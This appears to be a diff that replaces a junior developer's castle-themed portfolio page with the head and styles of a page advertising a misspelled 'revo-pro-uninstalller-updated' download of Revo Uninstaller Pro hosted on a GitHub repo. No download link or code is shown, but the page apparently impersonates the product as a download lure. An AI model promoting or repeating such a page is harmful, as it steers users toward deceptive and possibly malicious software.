@@ -1,810 +1,266 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>DEVCASTLE | BRTSDEV</title>
-<meta name="description" content="DEVCASTLE, the home of BRTSDEV: a junior developer learning Python and C++ on the way into cyber security.">
-<meta name="theme-color" content="#11161c">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>revo-pro-uninstalller-updated - Completely Remove Stubborn Programs From Windows</title>
+<meta name="description" content="Revo Uninstaller Pro helps you completely uninstall programs, remove leftovers, and clean your system for optimal performance. Download the updated package for Windows and follow the simple steps to get started.">
+<meta name="keywords" content="app-remover, clean-up, pc-cleaning-solutions-windows, revo-uninstaller, uninstall programs, remove leftovers, windows cleaner, revo uninstaller pro">
+<meta name="robots" content="index, follow">
+<meta name="author" content="revo-pro-uninstalller-updated">
+<link rel="canonical" href="https://github.com/khanatedama313/revo-pro-uninstalller-updated">
 <meta property="og:type" content="website">
-<meta property="og:title" content="DEVCASTLE | BRTSDEV">
-<meta property="og:description" content="DEVCASTLE, the home of BRTSDEV: a junior developer learning Python and C++ on the way into cyber security.">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%2311161c'/%3E%3Cpath d='M7 27V8h4v3h3V8h4v3h3V8h4v19h-6v-6a3 3 0 0 0-6 0v6z' fill='%23a9c1cf'/%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;800&display=swap">
+<meta property="og:title" content="revo-pro-uninstalller-updated - Completely Remove Stubborn Programs From Windows">
+<meta property="og:description" content="Revo Uninstaller Pro helps you completely uninstall programs, remove leftovers, and clean your system for optimal performance. Download for Windows.">
+<meta property="og:url" content="https://github.com/khanatedama313/revo-pro-uninstalller-updated">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="revo-pro-uninstalller-updated - Completely Remove Stubborn Programs From Windows">
+<meta name="twitter:description" content="Completely uninstall programs, remove leftovers, and clean your Windows system for optimal performance.">
 <style>
-  /* DEVCASTLE. The DEATHCASTLE theme turned into a website: one palette, one font, hard corners.
-     The page is a castle. The hero is the view from outside, every lit window is a link to a chamber,
-     and each section below is one of those chambers. Amber is only for firelight. */
-  :root {
-    --bg: #11161c;
-    --panel: #171d24;
-    --surface: #232a31;
-    --line: #2e3740;
-    --muted: #8fa2ac;
-    --fg: #d5dee6;
-    --accent: #a9c1cf;
-    --amber: #e0b060;
-    --on-accent: #11161c;
-    --glass: rgba(17, 22, 28, 0.86);
-    --font: "JetBrains Mono", ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
-    --ease: cubic-bezier(0.2, 0.7, 0.2, 1);
-    --header-h: 3.25rem;
-    color-scheme: dark;
-  }
-  /* Hidden mode: the castle by torchlight */
-  :root[data-mode="torch"] { --accent: #e0b060; --muted: #a39a86; }
-
-  *, *::before, *::after { box-sizing: border-box; }
-  [hidden] { display: none !important; }
+  * { box-sizing: border-box; }
   html { scroll-behavior: smooth; }
   body {
     margin: 0;
-    color: var(--fg);
-    font-family: var(--font);
-    font-size: 0.9375rem;
-    line-height: 1.7;
-    background-color: var(--bg);
-    /* Faint stone blocks, so the inside of the castle reads as a wall */
-    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='80'%3E%3Cpath d='M0 0H160M0 40H160M40 0V40M120 0V40M0 40V80M80 40V80' fill='none' stroke='%23ffffff' stroke-opacity='.018'/%3E%3C/svg%3E");
+    padding: 0;
+    background: #f4f7fb;
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.75;
+    font-size: 17px;
+    -webkit-font-smoothing: antialiased;
   }
-  .wrap { max-width: 68rem; margin-inline: auto; padding-inline: 1rem; }
-  a { color: var(--accent); text-underline-offset: 0.2em; }
-  a:focus-visible, button:focus-visible { outline: 2px solid var(--amber); outline-offset: 3px; }
-
-  /* Battlements: the one shape the whole site is built from */
-  .battlement {
-    height: 20px;
-    background:
-      repeating-linear-gradient(90deg, var(--surface) 0 24px, transparent 24px 48px) top / 100% 12px no-repeat,
-      linear-gradient(var(--surface), var(--surface)) bottom / 100% 8px no-repeat;
+  .page {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 32px 20px 64px;
   }
-
-  /* Header */
-  .site-header { position: sticky; top: 0; z-index: 20; height: var(--header-h); margin-bottom: calc(var(--header-h) * -1); border-bottom: 1px solid transparent; transition: background 0.3s var(--ease), border-color 0.3s var(--ease); }
-  .site-header.scrolled { background: var(--glass); border-bottom-color: var(--line); }
-  /* Keeps the nav readable where a wide screen puts the moon behind it */
-  .site-header:not(.scrolled) { background: linear-gradient(rgba(17, 22, 28, 0.92) 40%, transparent) no-repeat; background-origin: border-box; }
-  .site-header:not(.scrolled) .nav a { color: var(--fg); }
-  .site-header .wrap { height: 100%; display: flex; align-items: center; justify-content: space-between; gap: 1rem; }
-  .brand { display: inline-flex; align-items: center; gap: 0.55rem; font-weight: 600; font-size: 0.875rem; letter-spacing: 0.08em; color: var(--fg); text-decoration: none; }
-  .brand svg { width: 1rem; height: 1rem; fill: var(--accent); }
-  .nav { display: flex; align-items: center; gap: 1.1rem; }
-  .nav a { font-size: 0.75rem; letter-spacing: 0.06em; text-transform: uppercase; color: var(--muted); text-decoration: none; transition: color 0.2s; }
-  .nav a:hover { color: var(--fg); }
-  .term-btn { display: inline-flex; align-items: center; justify-content: center; width: 2rem; height: 2rem; padding: 0; background: transparent; border: 1px solid var(--line); color: var(--muted); cursor: pointer; transition: color 0.2s, border-color 0.2s; }
-  .term-btn:hover { color: var(--accent); border-color: var(--accent); }
-  .term-btn svg { width: 1rem; height: 1rem; fill: none; stroke: currentColor; stroke-width: 1.8; stroke-linecap: square; }
-  .progress { position: absolute; left: 0; right: 0; bottom: -1px; height: 2px; background: var(--amber); transform: scaleX(0); transform-origin: left; }
-
-  /* The view from outside */
-  .band { position: relative; overflow: hidden; min-height: max(100vh, 46vw); min-height: max(100svh, 46vw); background: #232a31; display: flex; flex-direction: column; justify-content: center; }
-  .scene { position: absolute; inset: 0; width: 100%; height: 100%; display: block; }
-  .band > .wrap { position: relative; z-index: 1; width: 100%; pointer-events: none; }
-  .hero { max-width: 37rem; padding-block: calc(var(--header-h) + 2rem) 6rem; }
-  .hero > * { pointer-events: auto; }
-  .prompt-line { margin: 0 0 1.1rem; font-size: 0.875rem; color: var(--muted); display: flex; flex-wrap: wrap; align-items: center; }
-  .prompt-line .usr { color: var(--accent); }
-  .prompt-line .path { color: var(--fg); }
-  .prompt-line .cmd { margin-left: 0.6ch; color: var(--fg); }
-  .cursor { display: inline-block; width: 0.6ch; height: 1.05em; margin-left: 0.4ch; background: var(--amber); transform: translateY(0.12em); }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    box-shadow: 0 6px 24px rgba(15, 23, 42, 0.07);
+    padding: 32px;
+    margin-bottom: 28px;
+  }
   h1 {
-    font-weight: 800;
-    font-size: clamp(3rem, 7.6vw, 6rem);
-    line-height: 1;
+    font-size: 2rem;
+    line-height: 1.25;
+    margin: 0 0 16px;
+    color: #0f172a;
     letter-spacing: -0.02em;
-    margin: 0 0 0.5rem;
-    white-space: nowrap;
-    user-select: none;
-    -webkit-user-select: none;
-    cursor: default;
   }
-  .sub { margin: 0 0 1.25rem; font-size: 0.875rem; font-weight: 600; letter-spacing: 0.14em; text-transform: uppercase; color: var(--accent); }
-  .aka { margin: -0.75rem 0 1.25rem; font-size: 0.8125rem; color: var(--amber); }
-  .lead { font-size: clamp(1rem, 1.8vw, 1.15rem); line-height: 1.6; margin: 0 0 1.5rem; text-wrap: pretty; }
-  .open { display: flex; flex-wrap: wrap; gap: 0.5rem; margin: 0; padding: 0; list-style: none; }
-  .hint { margin: 1.25rem 0 0; font-size: 0.8125rem; color: var(--muted); }
-  .hint b { font-weight: 500; color: var(--amber); }
-
-  .chip { font-size: 0.6875rem; line-height: 1.5; letter-spacing: 0.06em; text-transform: uppercase; border: 1px solid var(--line); padding: 0.2rem 0.6rem; color: var(--muted); white-space: nowrap; }
-  .chip.done { background: var(--accent); border-color: var(--accent); color: var(--on-accent); font-weight: 600; }
-  .chip.learning { border-color: var(--accent); color: var(--accent); }
-  .chip.using { background: var(--surface); border-color: var(--surface); color: var(--accent); }
-
-  /* Windows of the castle */
-  .door { cursor: pointer; }
-  .door .hit { fill: transparent; }
-  .door .win { fill: var(--amber); animation: flicker 5s steps(1) infinite; }
-  .door .glow { opacity: 0.55; transition: opacity 0.25s; }
-  .door .lbl { font: 600 19px var(--font); fill: var(--fg); text-anchor: middle; opacity: 0; paint-order: stroke; stroke: #11161c; stroke-width: 6px; transition: opacity 0.2s; pointer-events: none; }
-  .door:hover .glow, .door:focus-visible .glow { opacity: 1; }
-  .door:hover .lbl, .door:focus-visible .lbl { opacity: 1; }
-  .door:hover .win, .door:focus-visible .win { animation: none; }
-  .d2 .win { animation-delay: -1.3s; animation-duration: 7s; }
-  .d3 .win { animation-delay: -2.9s; animation-duration: 4.2s; }
-  .d4 .win { animation-delay: -3.7s; animation-duration: 8.5s; }
-  .dark-win { fill: #e0b060; opacity: 0.5; }
-
-  /* Chambers */
-  .row { display: grid; grid-template-columns: 11rem minmax(0, 1fr); gap: 1rem 3rem; padding-block: 3rem; scroll-margin-top: var(--header-h); }
-  .row > * { min-width: 0; }
-  .row + .battlement { opacity: 0.6; }
-  .rail { align-self: start; position: sticky; top: calc(var(--header-h) + 1.25rem); }
-  h2 { font-weight: 600; font-size: 1rem; line-height: 1.3; letter-spacing: 0.04em; color: var(--fg); margin: 0; }
-  .rail span { display: block; margin-top: 0.15rem; font-size: 0.8125rem; color: var(--accent); }
-  p { margin: 0 0 1rem; max-width: 42rem; text-wrap: pretty; }
-  p:last-child { margin-bottom: 0; }
-  code { font-family: var(--font); font-size: 0.9em; background: var(--surface); padding: 0.05em 0.35em; }
-
-  /* Armoury and languages */
-  .skills { margin: 0; padding: 0; list-style: none; display: grid; }
-  .skills li { display: flex; align-items: center; gap: 0.9rem; padding-block: 0.7rem; border-bottom: 1px solid var(--line); }
-  .skills li:first-child { padding-top: 0; }
-  .skills li:last-child { border-bottom: 0; padding-bottom: 0; }
-  .ico { display: inline-flex; align-items: center; justify-content: center; flex: none; width: 2.5rem; height: 2.5rem; background: var(--panel); border: 1px solid var(--line); color: var(--accent); transition: border-color 0.25s var(--ease), color 0.25s var(--ease); }
-  .ico svg { width: 1.3rem; height: 1.3rem; fill: none; stroke: currentColor; stroke-width: 1.6; stroke-linecap: square; }
-  .skills li:hover .ico { border-color: var(--amber); color: var(--amber); }
-  .skills .name { font-weight: 600; min-width: 8.5rem; }
-  .skills .note { color: var(--muted); font-size: 0.875rem; flex: 1; min-width: 0; }
-  .langs .name { flex: 1; }
-
-  /* Forge */
-  .projects { display: grid; gap: 2rem; padding-top: 12px; }
-  .project { position: relative; isolation: isolate; padding: 1.5rem; background: var(--panel); border: 1px solid var(--line); transition: border-color 0.3s var(--ease); }
-  /* Each project is its own small tower */
-  .project::after { content: ""; position: absolute; left: -1px; right: -1px; top: -11px; height: 10px; background: repeating-linear-gradient(90deg, var(--line) 0 16px, transparent 16px 32px); transition: background 0.3s var(--ease); }
-  /* A torch follows the pointer */
-  .project::before { content: ""; position: absolute; inset: 0; z-index: -1; opacity: 0; transition: opacity 0.3s var(--ease); background: radial-gradient(320px circle at var(--mx, 50%) var(--my, 0%), rgba(224, 176, 96, 0.13), transparent 70%); }
-  .project:hover { border-color: var(--muted); }
-  .project:hover::after { background: repeating-linear-gradient(90deg, var(--muted) 0 16px, transparent 16px 32px); }
-  .project:hover::before { opacity: 1; }
-  .project header { display: flex; flex-wrap: wrap; align-items: center; gap: 0.5rem 0.9rem; margin-bottom: 0.6rem; }
-  h3 { font-weight: 600; font-size: 1.125rem; line-height: 1.3; margin: 0; overflow-wrap: anywhere; }
-  .tags { display: flex; flex-wrap: wrap; gap: 0.4rem; margin: 1rem 0 0; padding: 0; list-style: none; }
-  .tags li { font-size: 0.75rem; color: var(--muted); border: 1px solid var(--line); padding: 0.05rem 0.5rem; }
-  .link { display: inline-block; margin-top: 1rem; font-weight: 500; text-decoration: none; }
-  .link::after { content: "\2192"; display: inline-block; margin-left: 0.4rem; transition: transform 0.25s var(--ease); }
-  .link:hover { text-decoration: underline; }
-  .link:hover::after { transform: translateX(5px); }
-
-  /* Archive */
-  .shell-block { font-size: 0.875rem; }
-  .shell-block + .shell-block { margin-top: 1.5rem; }
-  .sh-cmd { margin: 0 0 0.6rem; color: var(--muted); max-width: none; }
-  .sh-cmd::before { content: "$ "; color: var(--accent); }
-  .out { margin: 0; padding: 0; list-style: none; display: grid; gap: 0.35rem; }
-  .out li { display: grid; grid-template-columns: 5.5rem minmax(0, 1fr); gap: 0.25rem 1rem; }
-  .out .hash { color: var(--amber); }
-  .out .date { color: var(--muted); }
-  .out .todo-box { color: var(--accent); }
-  .out li.todo-row { grid-template-columns: 2.5rem minmax(0, 1fr); }
-
-  /* Gate */
-  .contact { margin: 0; padding: 0; list-style: none; display: grid; gap: 0.5rem; }
-  .contact li { display: flex; flex-wrap: wrap; gap: 0.25rem 1rem; }
-  .contact .k { font-size: 0.8125rem; color: var(--muted); width: 5.5rem; flex: none; padding-top: 0.1rem; }
-
-  footer { padding-block: 2rem 3rem; color: var(--muted); font-size: 0.8125rem; display: flex; flex-wrap: wrap; justify-content: space-between; gap: 0.5rem 1.5rem; }
-  footer kbd { font-family: var(--font); font-size: 0.8125rem; border: 1px solid var(--line); padding: 0 0.4rem; color: var(--fg); }
-
-  /* Terminal */
-  .term { position: fixed; z-index: 40; left: 1rem; right: 1rem; bottom: 1rem; max-width: 42rem; margin-inline: auto; height: min(24rem, 62vh); display: flex; flex-direction: column; background: var(--bg); border: 1px solid var(--accent); box-shadow: 0 30px 80px -20px rgba(0, 0, 0, 0.8); overflow: hidden; }
-  .term-bar { display: flex; align-items: center; gap: 0.75rem; padding: 0.5rem 0.9rem; background: var(--panel); border-bottom: 1px solid var(--line); font-size: 0.75rem; color: var(--muted); }
-  .term-title { flex: 1; }
-  .term-x { font-family: var(--font); font-size: 0.6875rem; letter-spacing: 0.05em; text-transform: uppercase; background: transparent; color: var(--muted); border: 1px solid var(--line); padding: 0.1rem 0.45rem; cursor: pointer; }
-  .term-x:hover { color: var(--fg); border-color: var(--accent); }
-  .term-out { flex: 1; min-height: 0; overflow-y: auto; padding: 0.75rem 1rem; font-size: 0.8125rem; line-height: 1.6; }
-  .tl { white-space: pre-wrap; overflow-wrap: anywhere; color: var(--fg); }
-  .tl.cmd, .tl.dim { color: var(--muted); }
-  .tl.ok { color: var(--amber); }
-  .term-in { display: flex; align-items: center; gap: 0.6rem; padding: 0.6rem 1rem; border-top: 1px solid var(--line); }
-  .term-in label { font-size: 0.8125rem; color: var(--accent); white-space: nowrap; }
-  .term-in input { flex: 1; min-width: 0; background: transparent; border: 0; color: var(--fg); font-family: var(--font); font-size: 1rem; padding: 0.2rem 0; }
-  .term-in input:focus-visible { outline: none; }
-
-  .toast { position: fixed; z-index: 60; left: 50%; bottom: 1.5rem; transform: translate(-50%, 12px); max-width: calc(100% - 2rem); padding: 0.55rem 1rem; background: var(--bg); color: var(--amber); border: 1px solid var(--amber); font-size: 0.8125rem; letter-spacing: 0.06em; text-transform: uppercase; opacity: 0; pointer-events: none; transition: opacity 0.3s var(--ease), transform 0.3s var(--ease); }
-  .toast.show { opacity: 1; transform: translate(-50%, 0); }
-  .rain { position: fixed; inset: 0; z-index: 50; pointer-events: none; transition: opacity 0.7s; }
-
-  /* The gate, raised once when the page opens. Decoration only: it never blocks a click. */
-  .portcullis { display: none; }
-
-  @media (max-width: 900px) {
-    /* Text first, then the castle below it */
-    .band { display: block; min-height: 0; }
-    .scene { inset: auto 0 0 auto; width: max(100%, 720px); height: auto; aspect-ratio: 16 / 9; -webkit-mask-image: linear-gradient(transparent, #000 10%); mask-image: linear-gradient(transparent, #000 10%); }
-    .hero { max-width: none; padding-block: calc(var(--header-h) + 2.25rem) max(24rem, 50vw); }
-    h1 { font-size: clamp(3rem, 13.5vw, 6rem); }
-    .row { grid-template-columns: minmax(0, 1fr); gap: 1rem; padding-block: 2.25rem; }
-    .rail { position: static; }
+  h2 {
+    font-size: 1.4rem;
+    line-height: 1.3;
+    margin: 0 0 14px;
+    color: #0f172a;
+    letter-spacing: -0.01em;
   }
-  @media (max-width: 720px) {
-    .nav { gap: 0.9rem; }
-    .skills li { flex-wrap: wrap; }
-    .skills .note { flex-basis: 100%; order: 3; padding-left: 3.4rem; }
-    .skills .name { flex: 1; min-width: 0; }
-    .project { padding: 1.25rem; }
+  h3 {
+    font-size: 1.1rem;
+    margin: 24px 0 8px;
+    color: #1e293b;
   }
-  @media (max-width: 360px) {
-    .nav a[href="#projects"] { display: none; }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #2563eb; }
+  .btn {
+    display: inline-block;
+    padding: 16px 32px;
+    border-radius: 12px;
+    color: #ffffff !important;
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    box-shadow: 0 8px 20px rgba(37, 99, 235, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
   }
-  @media (max-width: 480px) {
-    .nav a[href="#about"] { display: none; }
-    .out li { grid-template-columns: minmax(0, 1fr); gap: 0; }
-    .out li.todo-row { grid-template-columns: 2.5rem minmax(0, 1fr); }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 26px rgba(37, 99, 235, 0.34); }
+  .btn-wrap { text-align: center; margin: 28px 0 8px; }
+  .note {
+    background: #eef6ff;
+    border-left: 4px solid #2563eb;
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 18px 0;
+    font-size: 0.98rem;
   }
-
-  /* Motion: only when the viewer has not asked for less. Every animation ends on the normal, visible state. */
-  @media (prefers-reduced-motion: no-preference) {
-    @keyframes blink { 0%, 49% { opacity: 1; } 50%, 100% { opacity: 0; } }
-    @keyframes pop { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: none; } }
-    @keyframes twinkle { 0%, 100% { opacity: 0.85; } 50% { opacity: 0.15; } }
-    @keyframes breathe { 0%, 100% { opacity: 0.7; } 50% { opacity: 1; } }
-    @keyframes drift { from { transform: translateX(-70px); } to { transform: translateX(90px); } }
-    @keyframes flicker { 0%, 100% { opacity: 1; } 43% { opacity: 0.45; } 46% { opacity: 1; } 71% { opacity: 0.65; } 73% { opacity: 1; } }
-    @keyframes raise { 0%, 22% { transform: none; } 100% { transform: translateY(-110%); visibility: hidden; } }
-    .cursor { animation: blink 1.05s steps(1) infinite; }
-    .star { animation: twinkle 4s ease-in-out infinite; }
-    .s2 { animation-delay: -1.1s; animation-duration: 5.5s; }
-    .s3 { animation-delay: -2.3s; animation-duration: 3.4s; }
-    .s4 { animation-delay: -3.2s; animation-duration: 6.2s; }
-    .halo { animation: breathe 7s ease-in-out infinite; }
-    .mist { animation: drift 26s ease-in-out infinite alternate; }
-    .m2 { animation-duration: 38s; animation-direction: alternate-reverse; }
-    .term:not([hidden]) { animation: pop 0.25s var(--ease) both; }
-    .portcullis {
-      display: block;
-      position: fixed;
-      inset: 0 0 auto;
-      height: 100%;
-      z-index: 70;
-      pointer-events: none;
-      /* Iron bars, with spikes along the bottom edge */
-      background:
-        repeating-linear-gradient(90deg, #0a0e12 0 10px, transparent 10px 72px),
-        repeating-linear-gradient(0deg, #0a0e12 0 10px, transparent 10px 96px),
-        rgba(10, 14, 18, 0.55);
-      animation: raise 1.5s cubic-bezier(0.7, 0, 0.3, 1) both;
-    }
-    .portcullis::after { content: ""; position: absolute; left: 0; right: 0; top: 100%; height: 34px; background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='72' height='34'%3E%3Cpath d='M0 0h10l-5 34z' fill='%230a0e12'/%3E%3C/svg%3E") repeat-x; }
-    @supports (animation-timeline: view()) {
-      @keyframes rise { from { opacity: 0.25; transform: translateY(26px); } to { opacity: 1; transform: none; } }
-      .reveal { animation: rise linear both; animation-timeline: view(); animation-range: entry 0% entry 35%; }
-    }
+  .steps { counter-reset: none; }
+  .steps li { margin-bottom: 14px; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0 22px;
+    font-size: 0.97rem;
   }
-  @media (prefers-reduced-motion: reduce) {
-    html { scroll-behavior: auto; }
-    *, *::before, *::after { transition: none !important; animation: none !important; }
+  th, td {
+    text-align: left;
+    padding: 12px 14px;
+    border-bottom: 1px solid #e5e7eb;
+  }
+  th { background: #f8fafc; font-weight: 700; color: #0f172a; }
+  hr { border: none; border-top: 1px solid #e5e7eb; margin: 28px 0; }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    .card { padding: 22px 18px; border-radius: 12px; }
+    h1 { font-size: 1.55rem; }
+    h2 { font-size: 1.2rem; }
+    .btn { display: block; padding: 15px 20px; font-size: 1rem; }
   }
 </style>
 </head>
 <body>
-<div class="portcullis" aria-hidden="true"></div>
+<main class="page">
 
-<svg width="0" height="0" style="position:absolute" aria-hidden="true" focusable="false">
-  <symbol id="i-code" viewBox="0 0 24 24"><path d="M8 8l-4 4 4 4M16 8l4 4-4 4M13.5 6l-3 12"/></symbol>
-  <symbol id="i-chip" viewBox="0 0 24 24"><rect x="7" y="7" width="10" height="10"/><path d="M10 3v4M14 3v4M10 17v4M14 17v4M3 10h4M3 14h4M17 10h4M17 14h4"/></symbol>
-  <symbol id="i-layers" viewBox="0 0 24 24"><path d="M12 4l8 4-8 4-8-4 8-4z"/><path d="M4 12l8 4 8-4M4 16l8 4 8-4"/></symbol>
-  <symbol id="i-branch" viewBox="0 0 24 24"><circle cx="7" cy="6" r="2"/><circle cx="7" cy="18" r="2"/><circle cx="17" cy="9" r="2"/><path d="M7 8v8M17 11c0 3.5-5 3.5-10 5"/></symbol>
-  <symbol id="i-check" viewBox="0 0 24 24"><circle cx="12" cy="12" r="8.5"/><path d="M8.5 12.5l2.5 2.5 4.5-5"/></symbol>
-  <symbol id="i-lock" viewBox="0 0 24 24"><path d="M12 3.5l7 2.5v5.5c0 4.2-2.9 7.3-7 9-4.1-1.7-7-4.8-7-9V6l7-2.5z"/><circle cx="12" cy="11" r="1.6"/><path d="M12 12.6V15"/></symbol>
-  <symbol id="i-term" viewBox="0 0 24 24"><path d="M5 7l5 5-5 5M12 17h7"/></symbol>
-  <symbol id="i-tower" viewBox="0 0 32 32"><path d="M7 27V8h4v3h3V8h4v3h3V8h4v19h-6v-6a3 3 0 0 0-6 0v6z"/></symbol>
-</svg>
-
-<header class="site-header">
-  <div class="wrap">
-    <a class="brand" href="#top"><svg aria-hidden="true"><use href="#i-tower"/></svg>DEVCASTLE</a>
-    <nav class="nav" aria-label="Sections">
-      <a href="#about">About</a>
-      <a href="#projects">Projects</a>
-      <a href="#contact">Contact</a>
-      <button class="term-btn" type="button" id="open-term" aria-label="Open terminal"><svg viewBox="0 0 24 24" aria-hidden="true"><use href="#i-term"/></svg></button>
-    </nav>
-  </div>
-  <div class="progress" aria-hidden="true"></div>
-</header>
-
-<div class="band" id="top">
-  <svg class="scene" viewBox="0 0 1280 720" preserveAspectRatio="xMaxYMax slice" role="group" aria-label="A castle under a full moon. Each lit window links to a section of this page.">
-    <defs>
-      <linearGradient id="sky" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#232a31"/><stop offset="1" stop-color="#3a4852"/></linearGradient>
-      <radialGradient id="halo"><stop offset="0.5" stop-color="#a9c1cf" stop-opacity="0.5"/><stop offset="0.72" stop-color="#7e929d" stop-opacity="0.2"/><stop offset="1" stop-color="#7e929d" stop-opacity="0"/></radialGradient>
-      <radialGradient id="moon" cx="0.42" cy="0.38" r="0.72"><stop offset="0" stop-color="#d5dee6"/><stop offset="0.6" stop-color="#a9c1cf"/><stop offset="1" stop-color="#7e929d"/></radialGradient>
-      <radialGradient id="crater"><stop offset="0" stop-color="#5f727d" stop-opacity="0.7"/><stop offset="0.7" stop-color="#6d808b" stop-opacity="0.35"/><stop offset="1" stop-color="#7e929d" stop-opacity="0"/></radialGradient>
-      <radialGradient id="fog"><stop offset="0" stop-color="#a9c1cf" stop-opacity="0.2"/><stop offset="1" stop-color="#a9c1cf" stop-opacity="0"/></radialGradient>
-      <radialGradient id="fire"><stop offset="0" stop-color="#e0b060" stop-opacity="0.6"/><stop offset="1" stop-color="#e0b060" stop-opacity="0"/></radialGradient>
-      <linearGradient id="ground" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#1c232a"/><stop offset="1" stop-color="#11161c"/></linearGradient>
-    </defs>
-
-    <rect width="1280" height="720" fill="url(#sky)"/>
-    <g fill="#d5dee6">
-      <circle class="star" cx="64" cy="72" r="1.4"/><circle class="star s2" cx="212" cy="114" r="1"/><circle class="star s3" cx="344" cy="64" r="1.6"/>
-      <circle class="star s4" cx="486" cy="102" r="1"/><circle class="star s2" cx="596" cy="60" r="1.3"/><circle class="star" cx="660" cy="170" r="1"/>
-      <circle class="star s3" cx="1216" cy="66" r="1.5"/><circle class="star s4" cx="1168" cy="110" r="1.1"/><circle class="star s2" cx="118" cy="256" r="1"/>
-      <circle class="star s3" cx="420" cy="208" r="1.2"/><circle class="star" cx="600" cy="300" r="1"/><circle class="star s4" cx="1250" cy="178" r="1.2"/>
-    </g>
-
-    <circle class="halo" cx="930" cy="300" r="370" fill="url(#halo)"/>
-    <circle cx="930" cy="300" r="215" fill="url(#moon)"/>
-    <g fill="url(#crater)">
-      <ellipse cx="860" cy="190" rx="62" ry="50"/><ellipse cx="1000" cy="165" rx="48" ry="38"/><ellipse cx="1062" cy="250" rx="58" ry="66"/>
-      <ellipse cx="790" cy="300" rx="44" ry="58"/><ellipse cx="930" cy="250" rx="34" ry="26"/><ellipse cx="770" cy="400" rx="36" ry="42"/>
-      <ellipse cx="830" cy="120" rx="26" ry="18"/>
-    </g>
-
-    <path d="M0 610L120 566 260 596 400 548 540 590 640 560 760 600V720H0Z" fill="#2a343d"/>
-    <path d="M1060 500L1122 396 1168 340 1216 356 1250 276 1280 256V720H1060Z" fill="#232a31"/>
-    <path d="M1168 340L1190 420 1176 500M1250 276L1236 380 1262 470" fill="none" stroke="#2e3740" stroke-width="3"/>
-    <ellipse class="mist" cx="360" cy="600" rx="340" ry="26" fill="url(#fog)"/>
-
-    <!-- The mound and the castle on it, drawn from the DEATHCASTLE wallpaper -->
-    <path d="M500 720L600 652 662 628 712 562 730 500 742 488 770 486 800 486 860 486 930 486 1000 486 1076 482 1104 502 1152 524 1212 562 1280 578V720Z" fill="url(#ground)"/>
-    <path d="M716 566L760 590 742 640M840 520L880 566 850 620M1010 516L1040 572 1008 616M1152 524L1140 580 1176 626" fill="none" stroke="#2a333b" stroke-width="2"/>
-    <g fill="#1a2128" stroke="#34404a" stroke-width="1.5" stroke-linejoin="miter">
-      <rect x="745" y="396" width="38" height="96"/>
-      <rect x="800" y="328" width="64" height="164"/>
-      <rect x="864" y="380" width="128" height="112"/>
-      <path d="M1076 416L1092 440V492H1076Z"/>
-      <rect x="992" y="306" width="84" height="186"/>
-    </g>
-    <g fill="#141a20" stroke="#34404a" stroke-width="1.5" stroke-linejoin="miter">
-      <path d="M740 398L764 352 788 398Z"/>
-      <path d="M790 332L832 268 874 332Z"/>
-      <path d="M864 382L878 348 982 340 992 382Z"/>
-      <path d="M978 308L1034 232 1090 308Z"/>
-    </g>
-    <path d="M895 346L889 381M920 344L915 381M945 342L941 381M968 340L966 381M832 268L822 332M832 268L842 332M1034 232L1021 308M1034 232L1047 308" fill="none" stroke="#2e3740" stroke-width="1"/>
-    <g fill="#0d1115"><rect x="997" y="312" width="6" height="8"/><rect x="1014" y="312" width="6" height="8"/><rect x="1031" y="312" width="6" height="8"/><rect x="1048" y="312" width="6" height="8"/><rect x="1065" y="312" width="6" height="8"/></g>
-    <rect class="dark-win" x="1006" y="400" width="4" height="10"/><rect class="dark-win" x="1058" y="400" width="4" height="10"/><rect class="dark-win" x="814" y="424" width="4" height="10"/><rect class="dark-win" x="846" y="424" width="4" height="10"/><rect class="dark-win" x="924" y="434" width="4" height="9"/>
-
-    <path d="M738 492L752 489 772 492 792 489 812 492 840 489 870 492 905 489 940 492 975 489 1005 492 1040 489 1070 492 1098 489 1106 504H734Z" fill="#1c232a"/>
-
-    <!-- Every lit window is a link to a chamber -->
-    <a class="door" href="#about"><title>The Keep: about me</title><rect class="hit" x="1000" y="312" width="68" height="68"/><circle class="glow" cx="1034" cy="346" r="34" fill="url(#fire)"/><ellipse class="win" cx="1034" cy="346" rx="7" ry="13"/><text class="lbl" x="1034" y="308">The Keep</text></a>
-    <a class="door d2" href="#skills"><title>The Armoury: my skills</title><rect class="hit" x="798" y="330" width="68" height="68"/><circle class="glow" cx="832" cy="364" r="30" fill="url(#fire)"/><rect class="win" x="828" y="354" width="8" height="19"/><text class="lbl" x="832" y="330">The Armoury</text></a>
-    <a class="door d3" href="#languages"><title>The Embassy: languages I speak</title><rect class="hit" x="730" y="400" width="68" height="68"/><circle class="glow" cx="764" cy="432" r="26" fill="url(#fire)"/><rect class="win" x="760" y="424" width="7" height="16"/><text class="lbl" x="764" y="398">The Embassy</text></a>
